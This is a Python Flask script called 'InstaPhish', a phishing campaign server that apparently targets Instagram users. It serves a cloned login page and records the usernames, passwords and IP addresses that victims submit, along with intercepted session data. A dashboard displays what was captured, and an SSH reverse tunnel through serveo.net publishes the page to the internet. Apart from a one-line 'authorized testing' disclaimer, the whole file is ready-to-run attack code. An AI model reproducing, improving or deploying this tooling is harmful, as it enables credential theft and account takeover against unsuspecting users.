#!/usr/bin/env python3
"""
InstaPhish - Campaign Manager
Copyright (c) 2024 r4tur1
For authorized security testing and educational purposes only.
"""

import os
import time
import sys
import threading
import subprocess
from flask import Flask, request, render_template_string, send_from_directory

app  = Flask(__name__)
C    = []
S    = []
PAGE = "index.html"

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>InstaPhish - Campaign Dashboard</title>
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }
        h1   { color: #ff0044; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { border: 1px solid #00ff41; padding: 8px; text-align: left; }
        textarea { width: 100%; background: #000; color: #0f0; border: 1px solid #00ff41; }
        button { background: #ff0044; color: #fff; border: none; padding: 10px 20px; cursor: pointer; }
    </style>
</head>
<body>
    <h1>InstaPhish - Campaign Results</h1>
    <p>Credentials Captured: {{cc}} | Sessions Intercepted: {{sc}}</p>

    <h2>Credentials</h2>
    <table>
        <tr><th>Time</th><th>Username</th><th>Password</th><th>IP</th></tr>
        {% for e in cr %}
        <tr><td>{{e.t}}</td><td>{{e.u}}</td><td>{{e.p}}</td><td>{{e.i}}</td></tr>
        {% endfor %}
    </table>

    <h2>Sessions</h2>
    <table>
        <tr><th>Time</th><th>Data</th></tr>
        {% for e in ss %}
        <tr><td>{{e.t}}</td><td><textarea rows="3">{{e.d}}</textarea></td></tr>
        {% endfor %}
    </table>

    <form action="/c" method="post">
        <button type="submit">Clear All Logs</button>
    </form>
    <p style="margin-top:30px;font-size:0.8em;color:#555;">InstaPhish v1.0 | Authorized Testing Tool</p>
</body>
</html>
"""

@app.route('/')
def d():
    return render_template_string(HTML, cr=C[::-1][:50], cc=len(C), ss=S[::-1][:30], sc=len(S))

@app.route('/p')
def p():
    return send_from_directory('.', PAGE)

@app.route('/h', methods=['POST'])
def h():
    C.append({
        "u": request.form.get('username', ''),
        "p": request.form.get('password', ''),
        "i": request.remote_addr,
        "t": time.strftime("%H:%M:%S")
    })
    return "OK"

@app.route('/s', methods=['POST'])
def s():
    S.append({
        "d": request.get_data(as_text=True),
        "t": time.strftime("%H:%M:%S")
    })
    return "OK"

@app.route('/c', methods=['POST'])
def c():
    C.clear()
    S.clear()
    return "<script>window.location='/'</script>"

def tun():
    subprocess.run(["ssh", "-o", "StrictHostKeyChecking=no", "-R", "80:localhost:8080", "serveo.net"])

if __name__ == '__main__':
    if not os.path.exists(PAGE):
        print(f"[!] {PAGE} not found. Run clone.py first.")
        sys.exit(1)

    threading.Thread(target=tun, daemon=True).start()
    print("[+] Dashboard: http://localhost:8080")
    print("[+] Campaign URL: Serveo address + /p")
    app.run(host='0.0.0.0', port=8080, debug=False)